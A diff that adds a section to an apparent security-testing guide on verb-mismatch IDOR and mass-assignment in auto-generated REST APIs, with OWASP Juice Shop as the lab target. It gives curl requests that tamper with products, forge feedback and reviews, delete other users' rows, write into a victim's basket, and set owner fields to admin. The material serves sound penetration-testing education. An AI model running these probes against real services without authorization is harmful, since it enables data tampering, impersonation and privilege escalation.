@@ -212,6 +212,87 @@ done
 
 ---
 
+## Exposed Auto-CRUD REST / Verb-Mismatch (Juice Shop class)
+
+Frameworks that auto-expose ORM models as REST endpoints (Sequelize via `epilogue`/`finale`, Mongoose via auto-routers, LoopBack, FeathersJS, PostgREST, Hasura) generate a **full CRUD verb set per model** — `GET / POST / PUT / PATCH / DELETE` on `/api/{Model}` and `/api/{Model}/{id}` — even when the SPA only ever issues a `GET`. The browser client uses a narrow subset; the server happily honors the rest with little or no object-level authorization. This is the canonical **verb-mismatch IDOR**: the technique is to enumerate every model and probe the verbs the UI never sends.
+
+OWASP Juice Shop (base `http://localhost:3000`) is the reference target — its `models/` are auto-mounted at `/api/{Model}` and a hand-rolled REST layer at `/rest/{noun}`. Each probe below names the challenge it unlocks.
+
+**Methodology:**
+
+1. **Enumerate the model surface.** Walk the SPA's bundle for `/api/` and `/rest/` calls, then for each `Model` you find, try every verb — not just the one the client uses. A model the UI only `GET`s but that answers `PUT`/`POST`/`DELETE` without an ownership check is the bug.
+   ```
+   /api/Products/{id}       — UI only GETs; PUT/PATCH writeable?
+   /api/Feedbacks           — POST/DELETE without owning the row?
+   /api/BasketItems         — POST another user's BasketId?
+   /api/Reviews             — author as another user?
+   /rest/products/{id}/reviews
+   ```
+
+2. **PUT a product the UI only reads → "Product Tampering".** The catalog is read-only in the UI, but Sequelize exposes `PUT /api/Products/{id}`. Tamper a field (e.g. inject a redirect into the description / change `name` / `price`):
+   ```bash
+   # No write affordance exists in the UI — the verb-mismatch is the whole bug
+   curl -s -X PUT http://localhost:3000/api/Products/9 \
+     -H "Authorization: Bearer USER_B_TOKEN" \
+     -H "Content-Type: application/json" \
+     -d '{"description":"<a href=\"http://tampered.evil\">Apple Juice (1000ml)</a>"}'
+   # 200 + mutated product row = "Product Tampering"
+   ```
+
+3. **Forged + foreign-author Feedback → "Forged Feedback".** `POST /api/Feedbacks` accepts a `UserId` field the UI hardcodes to the session user. Set it to a victim (or omit it / null it to post anonymously as someone else):
+   ```bash
+   curl -s -X POST http://localhost:3000/api/Feedbacks \
+     -H "Authorization: Bearer USER_B_TOKEN" \
+     -H "Content-Type: application/json" \
+     -d '{"comment":"forged on victim behalf","rating":1,"UserId":2}'
+   # Row attributed to UserId=2 (victim) = "Forged Feedback"
+   ```
+
+4. **Five-star Feedback + Delete others' Feedback → "Five-Star Feedback" / "Forged Feedback".** The UI clamps `rating` and never deletes others' feedback, but the API does both:
+   ```bash
+   # Five-Star Feedback — submit max rating the captcha/UI normally constrains
+   curl -s -X POST http://localhost:3000/api/Feedbacks \
+     -H "Content-Type: application/json" \
+     -d '{"comment":"great","rating":5,"captchaId":0,"captcha":"0"}'
+
+   # DELETE another user's feedback row — no ownership check
+   curl -s -X DELETE http://localhost:3000/api/Feedbacks/1 \
+     -H "Authorization: Bearer USER_B_TOKEN"
+   ```
+
+5. **POST a BasketItem against another user's BasketId → "Manipulate Basket".** The SPA sends *your* `BasketId`; the API trusts whatever you send. Put items into (or read) a victim's basket:
+   ```bash
+   curl -s -X POST http://localhost:3000/api/BasketItems \
+     -H "Authorization: Bearer USER_B_TOKEN" \
+     -H "Content-Type: application/json" \
+     -d '{"ProductId":1,"BasketId":2,"quantity":1}'
+   # Item lands in BasketId=2 (victim's basket) = "Manipulate Basket"
+   # Variant: negative quantity → integer/price logic abuse
+   ```
+
+6. **Author a Review as another user → "Forged Review".** The Mongoose-backed review route at `/rest/products/{id}/reviews` (and `/api/Reviews`) accepts an `author` field the UI fills from the session:
+   ```bash
+   curl -s -X PUT http://localhost:3000/rest/products/1/reviews \
+     -H "Authorization: Bearer USER_B_TOKEN" \
+     -H "Content-Type: application/json" \
+     -d '{"message":"forged review","author":"victim@juice-sh.op"}'
+   # Review attributed to the victim = "Forged Review"
+   ```
+
+**Author/owner-field mass-assignment sub-probe.** The thread tying these together is that auto-CRUD bodies accept ownership/identity fields the client hardcodes — `UserId`, `author`, `BasketId`, `role`, `OrderId`, `ProductId`. The server merges the whole body into the ORM `create`/`update` and never strips them. For every create/update endpoint, add the fields the UI omits and point them at a **victim** (foreign ownership) or at **admin/elevated** values (privilege escalation):
+```bash
+# Probe: does the create body honor a foreign/elevated owner field?
+curl -s -X POST http://localhost:3000/api/Feedbacks \
+  -H "Content-Type: application/json" \
+  -d '{"comment":"x","rating":1,"UserId":1}'        # UserId=1 is admin in Juice Shop
+# If the stored row carries UserId=1, mass-assignment of the owner field is confirmed.
+```
+Generalize beyond Juice Shop: any field the SPA *sends with a fixed value* (or never sends at all) is a mass-assignment candidate — `role`, `isAdmin`, `verified`, `tenantId`, `accountId`. Send it explicitly and check whether it survives into the persisted object.
+
+**Triage note:** verb-mismatch and auto-CRUD IDORs are high-signal because the verb itself is the proof — there is no legitimate client path that issues it, so a `200` + mutated/foreign row is an unambiguous authorization failure (no "empty array / redacted field" ambiguity to chase down).
+
+---
+
 ## Common Root Causes
 
 1. **Missing ownership check in ORM queries**
